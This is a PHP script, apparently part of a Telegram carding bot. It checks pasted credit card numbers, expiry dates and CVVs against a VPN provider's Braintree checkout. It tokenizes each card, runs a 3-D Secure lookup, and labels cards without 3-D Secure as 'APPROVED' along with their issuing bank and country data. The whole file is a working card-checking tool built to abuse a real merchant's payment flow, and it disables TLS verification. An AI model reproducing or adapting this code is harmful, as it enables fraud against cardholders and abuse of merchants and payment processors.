<?php

#----------------------------------------------------------------------#
#   GATE: FLAGs GENERATOR                                              #
#----------------------------------------------------------------------#



////==============[ FLAGs GENERATOR ]==============////

function vbvlookup($lista){
    
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }


include "./Gates/functions/usefun.php";


//================ [ EXPLODE & LISTA ] ===============//
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }

if (strlen($ano) == 2) $ano = "20$ano";
if (strlen($mes) == 1) $mes = "0$mes";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";





//$ip = "Live! ✅";   
#--------------------[1th REQ]--------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.ivpn.net/web/accounts/create');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.ivpn.net';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.ivpn.net';
$headers[] = 'referer: https://www.ivpn.net/pricing/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"product":"IVPN Pro"}');
$res1 = curl_exec($ch);
curl_close($ch);



#--------------------[2th REQ]--------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.ivpn.net/web/accounts/braintree/client-token');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.ivpn.net';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://www.ivpn.net/account/add-funds/pro.1week/cc';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res2 = curl_exec($ch);
curl_close($ch);
$ctoken = trim(strip_tags(getStr($res2,'"token":"','"')));
$getbearer = base64_decode($ctoken);
$bearer = GetStr($getbearer,'"authorizationFingerprint":"','"');



#--------------------[3th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$res3 = curl_exec($ch);
curl_close($ch);
$token = trim(strip_tags(getStr($res3,'"token":"','"')));



#--------------------[4st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/fr8nng657hwwy3mn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.ivpn.net';
$headers[] = 'Referer: https://www.ivpn.net/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":4,"additionalInfo":{},"bin":"'.$first6.'","dfReferenceId":"0_'.SID().'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.81.0","cardinalDeviceDataCollectionTimeElapsed":18'.rand(11,99).',"issuerDeviceDataCollectionTimeElapsed":62'.rand(11,99).',"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.81.0","_meta":{"merchantAppId":"www.ivpn.net","platform":"web","sdkVersion":"3.81.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.SID().'"}}');
$res4 = curl_exec($ch);

$enrolle = trim(strip_tags(getStr($res4,'"enrolled":"','"')));
$status = trim(strip_tags(getStr($res4,'"status":"','"')));
$msg = trim(strip_tags(getStr($res4,'"message":"','"')));

$ibank = ucwords(strtolower(trim(strip_tags(getStr($res4,'"issuingBank":"','"')))));
$icountry = trim(strip_tags(getStr($res4,'"countryOfIssuance":"','"'))); 
$idebit = trim(strip_tags(getStr($res4,'"debit":"','"'))); 
$iprepaid = trim(strip_tags(getStr($res4,'"prepaid":"','"')));
$icommer = trim(strip_tags(getStr($res4,'"commercial":"','"')));
$ipayroll = trim(strip_tags(getStr($res4,'"payroll":"','"')));
//$flag = getFlags(''.$icountry.'');
//$bininfo1 = "$ibank - $icountry";

return " $status - [$enrolle] ";








/*
//=================== [ RESPONSES ] ===================//

if((strpos($res4, 'authenticate_successful')) || (strpos($res4, 'authenticate_attempt_successful')) || (strpos($res4, 'lookup_not_enrolled'))){
    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> NON-VBV CARD </b>✅%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}

elseif ((strpos($res4, 'lookup_enrolled')) || (strpos($res4, "challenge_required")) || (strpos($res4, "authenticate_frictionless_failed"))){
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> VBV CARD - (3D)</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}

elseif ((strpos($res4, 'authentication_unavailable')) || (strpos($res4, "authenticate_frictionless_failnaed"))){
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> AUTH UNAVAILABLE </b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}

elseif(strpos($res4,  '"status":"unsupported_card"')) {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>UNSUPPORTED CARD</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}

elseif(strpos($res4,  'error')) {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}

else {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 ꜱʜɪɴ々cʜᴀɴ 」</a>', $message_id);
}
*/



curl_close($ch);
unlink("cookie.txt");

}
    



////=============[Bin Command-END]==============////

?>